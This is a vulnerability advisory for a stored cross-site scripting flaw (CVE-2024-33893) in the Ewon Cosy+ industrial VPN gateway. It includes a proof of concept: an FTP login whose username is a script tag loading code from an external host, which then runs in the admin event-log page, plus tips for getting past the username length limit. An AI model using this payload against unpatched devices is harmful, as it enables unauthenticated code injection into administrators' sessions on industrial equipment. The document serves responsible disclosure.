Affected Version(s):       Firmware Versions: < 21.2s10 and < 22.1s3
Tested Version(s):         Firmware Version: 21.2s7
Vulnerability Type:        Improper Neutralization of Input During Web Page Generation (CWE-79)
Risk Level:                Medium
Solution Status:           Fixed
Manufacturer Notification: 2024-03-27
Solution Date:             2024-07-18
Public Disclosure:         2024-08-11
CVE Reference:             CVE-2024-33893
Author of Advisory:        Moritz Abrell, SySS GmbH

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The Ewon Cosy+ is a VPN gateway used for remote access and maintenance
in industrial environments.

The manufacturer describes the product as follows (see [1]):

"The Ewon Cosy+ gateway establishes a secure VPN connection between
the machine (PLC, HMI, or other devices) and the remote engineer.
The connection happens through Talk2m, a highly secured industrial
cloud service. The Ewon Cosy+ makes industrial remote access easy
and secure like never before!"

Due to improper neutralization of input, an unauthenticated attacker
is able to inject HTML and JavaScript code into the administrative
web interface of the device.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

If login against the FTP service of the Cosy+ fails, the submitted
username is saved in a log.
This log is included in the Cosy+ web interface without neutralizing
the content.
As a result, an unauthenticated attacker is able to inject
HTML/JavaScript code via the username of an FTP login attempt.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

1. Login attempt against Cosy+ FTP service:
    #> ftp "<script src=//x>"@192.168.10.33

2. JavaScript is included when visiting the event logs on Cosy+ web
    interface (http://192.168.10.33/index.shtm#EVLogsTbl):

    <div class="x-grid-cell-inner " style="text-align:left;">
        eftp-Close FTP session (User: <script src="//x">
    </div">

Note:
    The FTP username is limited to 16 characters and therefore the
    payload length is limited too.
    However, exploitation is still possible, e.g. by controlling
    DNS responses or using short URLs, e.g. an emoji domain.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

According to the manufacturer note[4], the vulnerability was fixed
with the firmware versions 21.2s10 and 22.1s3.
